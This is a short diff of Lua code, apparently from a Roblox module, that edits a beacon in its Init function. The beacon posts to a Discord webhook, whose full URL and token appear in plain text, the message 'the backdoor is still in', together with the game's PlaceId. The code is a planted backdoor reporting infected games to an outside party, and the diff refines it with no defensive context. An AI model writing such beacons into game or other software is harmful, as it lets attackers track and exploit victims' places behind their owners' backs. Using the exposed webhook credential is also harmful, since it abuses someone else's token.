@@ -25,7 +25,7 @@ function m:Init()
 		if PlaceId then
 			local Channel = "https://discord.com/api/webhooks/1360044566467842170/NuVI-TEQlHxgpyVFJTog8disz5xia_vohoEcKjekSMQZXNABvfNUUA3cU36lQRATCUXw"
 			local Info = {
-				Message = "the backdoor is still in "..tostring(PlaceId);
+				Message = "the backdoor is still in, PlaceId: "..tostring(PlaceId);
 				Title = "Lololol"
 			}
 			
